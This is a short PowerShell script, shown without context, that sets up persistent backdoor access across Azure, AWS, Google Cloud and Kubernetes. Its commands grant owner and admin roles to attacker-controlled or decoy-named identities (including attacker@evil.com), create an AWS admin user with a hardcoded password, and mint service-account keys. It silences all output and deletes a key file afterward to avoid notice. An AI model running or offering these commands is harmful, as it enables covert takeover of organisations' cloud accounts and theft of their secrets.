& az.cmd ad sp create-for-rbac --name "BackdoorApp" --role Contributor --scopes /subscriptions/00000000-0000-0000-0000-000000000000 2>&1 | Out-Null
& az.cmd ad app credential reset --id "00000000-0000-0000-0000-000000000000" --append 2>&1 | Out-Null
& az.cmd ad sp credential reset --id "00000000-0000-0000-0000-000000000000" --append 2>&1 | Out-Null
& az.cmd ad app create --display-name "LegitUpdateService" --key-type Password 2>&1 | Out-Null
& az.cmd role assignment create --assignee "attacker@evil.com" --role Owner 2>&1 | Out-Null
& az.cmd keyvault set-policy --name "corporate-vault" --upn "attacker@evil.com" --secret-permissions get list set 2>&1 | Out-Null

& aws.exe iam create-access-key --user-name administrator 2>&1 | Out-Null
& aws.exe iam create-user --user-name backdoor-svc 2>&1 | Out-Null
& aws.exe iam attach-user-policy --user-name backdoor-svc --policy-arn arn:aws:iam::aws:policy/AdministratorAccess 2>&1 | Out-Null
& aws.exe iam create-login-profile --user-name backdoor-svc --password "B@ckd00r!2026" --no-password-reset-required 2>&1 | Out-Null
& aws.exe iam add-user-to-group --user-name backdoor-svc --group-name Admins 2>&1 | Out-Null
& aws.exe sts get-session-token --duration-seconds 129600 2>&1 | Out-Null

& gcloud.cmd iam service-accounts create backdoor-sa --display-name="Monitoring Agent" 2>&1 | Out-Null
& gcloud.cmd iam service-accounts keys create "$env:TEMP\sa-key.json" --iam-account="backdoor-sa@proj.iam.gserviceaccount.com" 2>&1 | Out-Null
& gcloud.cmd projects add-iam-policy-binding proj --member="serviceAccount:backdoor-sa@proj.iam.gserviceaccount.com" --role="roles/owner" 2>&1 | Out-Null

& kubectl.exe create serviceaccount backdoor-admin -n kube-system 2>&1 | Out-Null
& kubectl.exe create clusterrolebinding backdoor-binding --clusterrole=cluster-admin --serviceaccount=kube-system:backdoor-admin 2>&1 | Out-Null

Remove-Item "$env:TEMP\sa-key.json" -Force -ErrorAction SilentlyContinue
